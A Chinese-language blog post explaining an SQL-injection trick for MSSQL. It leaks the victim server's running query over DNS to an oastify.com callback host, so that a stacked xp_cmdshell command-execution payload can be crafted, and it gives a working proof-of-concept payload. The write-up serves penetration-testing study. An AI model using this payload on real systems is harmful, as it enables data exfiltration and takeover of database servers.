---
layout: post
title:  "MSSQL SQL注入 xp_cmdshell的一个技巧"
date:   2025-09-03 17:10:23 +0800
categories: jekyll update
---
# MSSQL SQL注入 xp_cmdshell的一个技巧
Mssql发生sqli注入后, 如果是is_srvrolemember权限, 可以通过xp_cmdshell执行系统命令. xp_cmdshell需要闭合当前查询, 起一个新query(stacked query). 在实际工作中, 闭合当前查询往往并不十分容易, 例如原查询是
```SQL
select count(*) 
from (
  select optname 
  from [dbo].[MSreplication_options] 
  where 1=1) 
countable;
```
其中 1=1 攻击者可控. 在这个例子里, 使用一些不需要的闭合sql语句的简单用例, 例如substring(@@version,1,1)='M'是可以达到bool型的sql注入的, 但是执行xp_cmdshell并不容易. 多行的SQL语句, 简单的使用-- 单行注释语法并不能合法的闭合sql语句, 整个sql语句会因为语法错误而失败. 对于这种情况, 需要猜测原始的sql语句是什么才能有效闭合. 

注意到, MSSQL中, 如下表达式可以查询本次的SQL语句是什么.
```SQL
select text from sys.dm_exec_requests cross apply sys.dm_exec_sql_text(sql_handle)
```

对于以上的例子, 可以使用这个查询, 配合fn_xe_file_target_read_file这个函数的dns exfilterate, 把整个语句通过dns泄漏出来. 这样就可以针对性写出可以闭合sql语句的xp_cmdshell payload了. 

整体poc如下(用来替代原查询里的1=1)
``` SQL
exists(select * from fn_xe_file_target_read_file('C:\*.xel','\\'+substring((SELECT CAST(((select text from sys.dm_exec_requests cross apply sys.dm_exec_sql_text(sql_handle))) as varbinary(max)) FOR XML PATH(''), BINARY BASE64),1,60)+'.569py62fphof3b1e6zml1966wx2oqoed.oastify.com\1.xem',null,null))
```
注意到URL hostname label 不能超过63字节. 所以要substring一部分一部分dns exfiltrate出来. 

这个方法是非常通用的, 前提条件只需要VIEW SERVER STATE权限. 一般情况下, 只有在is_srvrolemember('sysadmin') 权限下我们才关心xp_cmdshell和闭合, 所以VIEW SERVER STATE是自动满足的.

一些注意事项: 

如果攻击者的payload被用在多条查询中一次执行(例如比较大的存储过程), 这个方法只能暴露第一条sql查询. 因为fn_xe_file_target_read_file在第一次执行后就运行时错误退出了.

如果攻击者的payload被用在多条查询中一次执行, 如果每处的syntax有较大差别, 那么即使知道原语句, 也不一定写得出每处都可以合法闭合的payload. 例如:
```SQL
select count(*) from (select optname from [dbo].[MSreplication_options] where 1=1) countable;
select optname from [dbo].[MSreplication_options] where 1=1;
```
注入点是1=1. 闭合第一句需要一个右括号,第二句不需要. 